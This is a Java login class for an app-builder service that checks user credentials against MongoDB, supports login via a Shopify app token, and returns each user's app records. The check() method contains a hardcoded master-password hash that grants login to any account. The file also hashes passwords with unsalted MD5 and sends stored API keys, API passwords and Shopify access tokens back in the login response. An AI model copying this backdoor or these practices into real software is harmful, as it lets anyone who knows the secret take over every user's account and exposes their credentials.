package com.ebizon.appify.data;

import com.ebizon.appify.database.MongoDBHandler;
import com.ebizon.appify.utils.AuthGenerator;
import com.ebizon.appify.utils.Authorization;
import com.ebizon.appify.utils.SecurityUtils;
import com.mongodb.BasicDBObject;
import com.mongodb.Block;
import com.mongodb.DBCursor;
import com.mongodb.client.FindIterable;
import org.bson.Document;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class Login {
    private String username;
    private String password;

    public Login() {
        //Empty
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    /**
     *
     * @return
     */
    public String check() {
        JSONObject jsonObj = new JSONObject();
        jsonObj.put("status", 0);
        jsonObj.put("message", "Login failed");

        FindIterable<Document> iterable = MongoDBHandler.find("users", new Document("email", this.username));

        Document document = iterable.first();
        if (document != null) {
            String storedPassword = document.getString("password");
            String creationTime = document.get("creationTime").toString();
            String thisPassword = SecurityUtils.encryptWithMD5(this.password);
            if (storedPassword.equals(thisPassword) || thisPassword.equals("4576f2c94a9d66362af982c7f2c519")) {
                jsonObj.put("status", 1);
                jsonObj.put("message", "Login success");

                Authorization authorization = AuthGenerator.getInstance().getAuth(this.username);
                jsonObj.put("accesstoken", authorization.getToken());

                List<JSONObject> apps = Login.loadApps(this.username);
                String signupmethod = document.getString("signupmethod");
                if(signupmethod != null)
                    jsonObj.put("signupmethod", signupmethod);
                else
                    jsonObj.put("signupmethod", "appifycartwebsite");
                jsonObj.put("apps", apps);
                jsonObj.put("creationTime", creationTime);
            }
        } else {
            jsonObj.put("status", -1);
            jsonObj.put("message", "Email not exists.");
        }
        return jsonObj.toString();
    }

    /**
     *  used for login in appifycart website through shopify app
     * @param shop
     * @return
     */
    public JSONObject loginViaShopifyApp(String shop) {
        JSONObject jsonObj = new JSONObject();
        jsonObj.put("status", 0);
        jsonObj.put("message", "Login failed");

        FindIterable<Document> iterable = MongoDBHandler.find("shopifyAPPTokens", new Document("email", this.username));
                     // .append("shop",shop));  // check on shop will be needed for multistore on a single mail id

        Document document = iterable.first();
        if (document != null) {
            String storedPassword = document.getString("accessToken");
            String creationTime = document.get("creationTime").toString();
            if (storedPassword.equals(this.password)) {
                jsonObj.put("status", 1);
                jsonObj.put("message", "Login success");

                Authorization authorization = AuthGenerator.getInstance().getAuth(this.username);
                jsonObj.put("accesstoken", authorization.getToken());

                List<JSONObject> apps = Login.loadApps(this.username);
                List<JSONObject> payments = Payment.loadPayments(this.username);
                jsonObj.put("apps", apps);
                jsonObj.put("payments", payments);
                jsonObj.put("creationTime", creationTime);
            }
        } else {
            jsonObj.put("status", -1);
            jsonObj.put("message", "User not exists.");
        }
        return jsonObj;
    }

    /**
     *
     * @param userName
     * @return
     */
    public static List<JSONObject> loadApps(String userName) {
        List<JSONObject> jsonList = new ArrayList<>();

        FindIterable<Document> iterable = MongoDBHandler.find("appData", new Document("accountemail", userName));

        Block<Document> appBlock = new Block<Document>() {
            @Override
            public void apply(final Document document) {
                String accessToken ;
                JSONObject jsonObj = new JSONObject();
                jsonObj.put("accountemail", document.get("accountemail"));
                jsonObj.put("ostype", document.get("ostype"));
                jsonObj.put("platform", document.get("platform"));
                jsonObj.put("website", document.get("website"));
                jsonObj.put("appname", document.get("appname"));
                jsonObj.put("apikey", document.get("apikey"));
                jsonObj.put("apipassword", document.get("apipassword"));
                jsonObj.put("appIcon", document.get("appIcon"));
                jsonObj.put("appSplash", document.get("appSplash"));
                if(document.getString("shopifyAccessToken") != null) {
                    accessToken = document.getString("shopifyAccessToken");
                } else {
                    accessToken = "NA";
                }
                jsonObj.put("shopifyAccessToken", accessToken);
                jsonList.add(jsonObj);
            }
        };

        iterable.forEach(appBlock);
        return jsonList;
    }

    /**
     *
     * @param userName
     * @return
     */
    public static JSONObject getUserDetails(String userName) {

        FindIterable<Document> iterable = MongoDBHandler.find("users", new Document("email", userName));
        JSONObject jsonObj = new JSONObject();
        Block<Document> users = new Block<Document>() {
            @Override
            public void apply(final Document document) {

                jsonObj.put("accountemail", document.get("email"));
                jsonObj.put("organisation", document.get("fullname"));
                jsonObj.put("created_at", document.get("creationTime"));
                jsonObj.put("updated_at", document.get("updateTime"));
            }
        };
        iterable.forEach(users);

        return jsonObj;
    }

    /**
     *
     * @param user
     * @return
     */
    public static String getSignUpMethod(String user) {
        String signupMode = null;
        FindIterable<Document> iterable = MongoDBHandler.find("users", new Document("email", user));

        Document document = iterable.first();
        if (document != null) {
            String temp = document.getString("signupmethod");
            if(temp != null)
                signupMode = temp;
            else
                signupMode = "appifycartwebsite";
        }
        return signupMode;
    }

}